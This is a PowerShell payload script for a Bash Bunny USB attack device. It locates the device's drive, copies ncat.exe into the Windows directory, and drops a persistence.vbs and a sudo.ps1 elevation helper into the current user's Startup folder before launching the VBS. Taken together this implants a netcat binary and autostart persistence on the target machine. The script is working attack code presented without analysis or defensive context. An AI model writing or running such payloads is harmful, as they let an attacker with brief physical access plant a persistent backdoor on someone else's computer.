$Drive = (Get-WMIObject Win32_Volume | ? { $_.Label -eq 'BashBunny' }).name
$user = $env:UserName
$sudoFile = $Drive + "payloads\switch1\sudo.ps1"
$NetCatFile = $Drive + "payloads\switch1\ncat.exe"
$PersistenceFile = $Drive + "payloads\switch1\persistence.vbs"
$DestinationFile1 = [System.Environment]::ExpandEnvironmentVariables("%WINDIR%")+"\ncat.exe"

$DestinationFile2 = ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\persistence.vbs")
$DestinationFile3 = ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sudo.ps1")


If ((Test-Path $DestinationFile1) -eq $false){
	& $sudoFile "New-Item -ItemType File -Path '$DestinationFile1' -Force"
}
If ((Test-Path $DestinationFile2) -eq $false){
	& $sudoFile "New-Item -ItemType File -Path '$DestinationFile2' -Force"
}
If ((Test-Path $DestinationFile3) -eq $false){
	& $sudoFile "New-Item -ItemType File -Path '$DestinationFile3' -Force"
}

#Copy-Item -Path $NetCatFile -Destination $DestinationFile1
& $sudoFile "Copy-Item -Path '$NetCatFile' -Destination '$DestinationFile1'"
& $sudoFile "Copy-Item -Path '$PersistenceFile' -Destination '$DestinationFile2'"
& $sudoFile "Copy-Item -Path '$sudoFile' -Destination '$DestinationFile3'"

Set-Location -Path ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")

Start-Process cmd -ArgumentList "/c start persistence.vbs"
